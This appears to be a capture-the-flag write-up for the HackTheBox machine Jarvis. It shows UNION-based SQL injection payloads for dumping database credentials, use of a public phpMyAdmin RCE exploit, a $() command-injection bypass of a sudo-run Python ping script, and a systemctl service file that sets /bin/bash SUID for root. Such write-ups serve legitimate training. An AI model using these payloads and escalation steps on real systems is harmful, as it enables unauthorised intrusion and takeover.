# Jarvis

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.173
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 06:40 EDT
Nmap scan report for 10.129.85.173
Host is up (0.0080s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown
```

We can take a look at port 80.

### SQL Injection --> phpMyAdmin RCE

Port 80 reveals a hotel site:

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

When looking at the rooms available, a unique URL is being used:

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Interesting. I ran a `gobuster` scan in the background while enumerating the URL for possible injection.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.85.173 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.85.173
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/04 06:42:10 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 312] [--> http://10.129.85.173/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.85.173/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.85.173/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.85.173/images/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.129.85.173/phpmyadmin/]
/sass                 (Status: 301) [Size: 313] [--> http://10.129.85.173/sass/]
```

There was a `/phpmyadmin` panel on the website, but we don't have any credentials yet. I tried some basic SQL injection on the `room.php` and found an interesting result.

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

The fact that it runs means that SQL injection might be the way. Initially, I tried `sqlmap` but it always crashes and blocks me for a while. So there was a firewall and I had to do this manually. First, we can try UNION injection to find out the number of columns.&#x20;

<figure><img src="../../../.gitbook/assets/image (34) (8).png" alt=""><figcaption></figcaption></figure>

It appears there are 7 columns. Now, we can start to enumerate the database. Following Hacktricks, we can make use of `group_concat()` to get the data out. This can be done using&#x20;

```sql
100 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata-- -
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

So this is a MySQL database being used. We can check on the tables and columns that are present within the database.&#x20;

{% code overflow="wrap" %}
```sql
100 UNION SELECT 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='mysql'-- -
column_stats,columns_priv,db,event,func,general_log,gtid_slave_pos,help_category,help_keyword,help_relation,help_topic,host,index_stats,innodb_index_stats,innodb_table_stats,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,slow_log,table_stats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user
```
{% endcode %}

We can see the `user` table.&#x20;

{% code overflow="wrap" %}
```sql
100 UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='user'-- -
Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time
```
{% endcode %}

The username and password look like the best thing to get out.&#x20;

<figure><img src="../../../.gitbook/assets/image (44) (8).png" alt=""><figcaption></figcaption></figure>

This can be cracked on CrackStation.

<figure><img src="../../../.gitbook/assets/image (5) (9).png" alt=""><figcaption></figcaption></figure>

With these credentials, we can login to the phpMyAdmin instance. The instance used here is outdated.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

There are public exploits for this.

```
$ searchsploit phpmyadmin 4.8.1  RCE
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)             | php/webapps/50457.py
```

We can verify that the exploit works.

<figure><img src="../../../.gitbook/assets/image (51) (5).png" alt=""><figcaption></figcaption></figure>

A `mkfifo` one-liner can be used to gain a reverse shell.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We can't grab the user flag as this user.

### Sudo Command Injection

When checking `sudo` privileges, we find that we can run a Python script as the user `pepper`.&#x20;

```
www-data@jarvis:/home/pepper$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Here's the script:

```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

The command injection point is here:

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

While there is verification of bad characters, this still allows sub-expressions using `$()`. This means that we can still run scripts as the user. As such, we can create a simple reverse shell bash script and execute it.&#x20;

```
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/tmp/shell.sh)
```

<figure><img src="../../../.gitbook/assets/image (12) (11).png" alt=""><figcaption></figcaption></figure>

We can now grab the user flag.&#x20;

### SUID

I ran a LinPEAS to enumerate the rest of the machine for me. There was an interesting SUID binary present:

```
[+] SUID - Check easy privesc, exploits and write perms                                      
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                
strace Not Found                                                                             
-rwsr-xr-x 1 root root        60K Nov 10  2016 /bin/ping                                     
-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root        59K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                             
-rwsr-xr-x 1 root root        40K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root        75K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        40K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root        49K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root        40K May 17  2017 /bin/su
-rwsr-xr-x 1 root root       138K Jun  5  2017 /usr/bin/sudo
-rwsr-xr-- 1 root messagebus  42K Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        31K Mar  7  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root        44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                            
 -rwsr-xr-x 1 root root        31K Aug 21  2018 /bin/fusermount
-rwsr-x--- 1 root pepper     171K Feb 17  2019 /bin/systemctl
```

`systemctl` would allow me to gain a reverse shell as `root` because I can control the system configurations. Based on GTFOBins, I need to create a `.service` file that makes `/bin/bash` an SUID binary, then link and start it.

```bash
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod u+s /bin/bash'

[Install]
WantedBy=multi-user.target

# afterwards run these
systemctl link /dev/shm/suid.service
systemctl start suid
/bin/bash -p
```

<figure><img src="../../../.gitbook/assets/image (27) (8).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
